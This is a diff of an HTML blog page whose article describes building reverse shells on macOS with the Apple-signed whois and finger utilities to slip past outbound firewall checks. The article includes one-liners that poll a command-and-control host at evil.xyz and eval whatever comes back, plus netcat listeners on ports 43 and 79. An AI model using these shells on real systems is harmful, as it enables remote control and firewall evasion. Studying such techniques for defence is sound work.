@@ -18,9 +18,10 @@ The Whois protocol The whois protocol is very simple TCP-based query/response pr
 <meta property="og:description" content="Introduction In the presentation Fire &amp; Ice: Making and Breaking macOS Firewalls, Patrick Wardle mentioned the idea of using binaries signed by Apple to by-pass firewall checks for outbound traffic. As an example, he mentioned whois. I thought it would be interesting to throw together a one-liner reverse shell that uses whois to do the socket handling. In addition to whois, what other system utilities can be used.
 The Whois protocol The whois protocol is very simple TCP-based query/response protocol." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="/posts/whois-and-finger-reverse-shell/" />
+<meta property="og:url" content="/posts/whois-and-finger-reverse-shell/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2018-09-01T00:00:00+00:00" />
 <meta property="article:modified_time" content="2018-09-01T00:00:00+00:00" />
+
 
 
     
@@ -55,7 +56,7 @@ The Whois protocol The whois protocol is very simple TCP-based query/response pr
     <link rel="icon" type="image/png" href="../../images/favicon-32x32.png" sizes="32x32">
     <link rel="icon" type="image/png" href="../../images/favicon-16x16.png" sizes="16x16">
 
-    <meta name="generator" content="Hugo 0.80.0" />
+    <meta name="generator" content="Hugo 0.88.1" />
   </head>
 
   <body class=" ">
@@ -76,10 +77,6 @@ The Whois protocol The whois protocol is very simple TCP-based query/response pr
         
           <li class="navigation-item">
             <a class="navigation-link" href="https://go-re.tk">Go Reverse Engineering Tool Kit</a>
-          </li>
-        
-          <li class="navigation-item">
-            <a class="navigation-link" href="https://ipfs.io/ipns/gomalware.lekstu.ga">Go Malware</a>
           </li>
         
       
@@ -132,7 +129,7 @@ other system utilities can be used.</p>
 <p>The whois protocol is very simple TCP-based query/response protocol. Everything
 is sent as plain-text and by default, port 43 is used. An example request is
 shown below:</p>
-<pre><code>   client                           server at whois.nic.mil
+<pre tabindex="0"><code>   client                           server at whois.nic.mil
    open TCP   ---- (SYN) ------------------------------&gt;
               &lt;---- (SYN+ACK) --------------------------
    send query ---- &quot;Smith&lt;CR&gt;&lt;LF&gt;&quot; --------------------&gt;
@@ -147,7 +144,7 @@ the client of the end of the response by closing the socket.</p>
 <h1 id="macoss-whois-binary">macOS&rsquo;s Whois binary</h1>
 <p>The whois binary on macOS is signed by Apple, so it might be possible to use
 the binary to by-pass whitelisting restrictions.</p>
-<pre><code>$ codesign -dvvvv /usr/bin/whois
+<pre tabindex="0"><code>$ codesign -dvvvv /usr/bin/whois
 Executable=/usr/bin/whois
 Identifier=com.apple.whois
 Format=Mach-O thin (x86_64)
@@ -183,10 +180,10 @@ when we invoke <code>whois</code>. The idea is as follow:</p>
 invoked. Otherwise, an error is returned.</p>
 <p>Putting it all together you get the following line to connect to a C2 server
 listing at <code>evil.xyz</code>:</p>
-<pre><code>export X=Connected; while true; do X=`eval $(whois -h evil.xyz -- &quot;Output: $X&quot;)`; sleep 1; done
+<pre tabindex="0"><code>export X=Connected; while true; do X=`eval $(whois -h evil.xyz -- &quot;Output: $X&quot;)`; sleep 1; done
 </code></pre><h2 id="server">Server</h2>
 <p>On the server-side we can just use netcat as a POC implementation:</p>
-<pre><code>while true; do nc -l 43; done
+<pre tabindex="0"><code>while true; do nc -l 43; done
 </code></pre><p>Netcat runs in a while loop because we need to close the socket to signal
 the end of each command. Once a client has connected, type a command followed
 by pressing <code>enter</code> and <code>Ctrl+d</code> to close <code>STDIN</code>. When <code>STDIN</code> is closed,
@@ -203,10 +200,10 @@ It&rsquo;s query based over TCP. It uses port 79 by default.</p>
 implementation for macOS prints some status messages to <code>STDOUT</code> so some
 grep/sed is needed to filter out the command sent from the server.</p>
 <p>Client line for connecting to a C2 located at <code>evil.xyz</code>:</p>
-<pre><code>export X=Connected; while true; do X=`eval $(finger &quot;$X&quot;@evil.xyz 2&gt; /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
+<pre tabindex="0"><code>export X=Connected; while true; do X=`eval $(finger &quot;$X&quot;@evil.xyz 2&gt; /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
 </code></pre><h2 id="server-1">Server</h2>
 <p>The server is similar to the <code>whois</code> server:</p>
-<pre><code>while true; do nc -l 79; done
+<pre tabindex="0"><code>while true; do nc -l 79; done
 </code></pre><p>When sending a command to the client, we need to indicate where it starts
 and where it ends. The client line above expecting the command line to
 start with <code>!</code>. The end of the command is signaled by closing the socket
